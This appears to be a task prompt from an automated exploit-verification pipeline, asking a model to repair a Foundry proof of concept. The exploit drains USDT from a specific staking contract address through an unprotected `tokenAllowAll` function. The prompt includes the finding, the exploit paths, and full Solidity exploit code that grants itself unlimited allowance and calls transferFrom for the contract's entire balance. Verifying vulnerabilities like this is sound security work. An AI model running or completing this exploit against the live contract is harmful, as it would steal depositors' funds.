You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can grant themselves unlimited allowance over tokens held by the contract
- claim: `tokenAllowAll` is publicly callable and has no access control, so any account can set `uint256(-1)` allowance from the contract to an arbitrary `allowee` for any ERC20 `asset`. Because the staking pool holds USDT, an attacker can approve themselves and then drain the contract with `transferFrom`.
- impact: Any external user can steal all USDT held by the staking contract, including deposited principal and any prefunded rewards. Any other ERC20 sent to the contract is also drainable.
- exploit_paths: ["Attacker calls `tokenAllowAll(USDT, attacker)`.", "The contract grants the attacker unlimited USDT allowance.", "Attacker calls `USDT.transferFrom(address(contract), attacker, USDT.balanceOf(address(contract)))` to drain the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUSDTStakingContract28 {
    function tokenAllowAll(address asset, address allowee) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        IERC20Like token = IERC20Like(USDT);
        uint256 balanceBefore = token.balanceOf(address(this));
        _profitAmount = balanceBefore;
        uint256 targetBalance = token.balanceOf(TARGET);

        if (targetBalance == 0) {
            return;
        }

        uint256 currentAllowance = token.allowance(TARGET, address(this));

        // Required exploit path:
        // 1. attacker calls tokenAllowAll(USDT, attacker)
        // 2. target grants unlimited allowance to attacker
        // 3. attacker drains target with transferFrom
        //
        // tokenAllowAll uses SafeERC20.safeApprove, so this step only succeeds when
        // the current allowance is 0. If the allowance is already max, step 2 has
        // already occurred and the drain can proceed. If the allowance is a non-zero
        // non-max value at the fork block, the stated path is mechanically blocked by
        // the target's approval helper, so this verifier does not pivot to another route.
        if (currentAllowance == 0) {
            IUSDTStakingContract28(TARGET).tokenAllowAll(USDT, address(this));
            currentAllowance = token.allowance(TARGET, address(this));
        }

        if (currentAllowance != type(uint256).max) {
            return;
        }

        _safeTransferFrom(USDT, TARGET, address(this), targetBalance);

        uint256 balanceAfter = token.balanceOf(address(this));
        _profitAmount = balanceAfter;
    }

    function profitToken() external pure returns (address) {
        return USDT;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount));
        require(success, "transferFrom call failed");
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "transferFrom returned false");
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
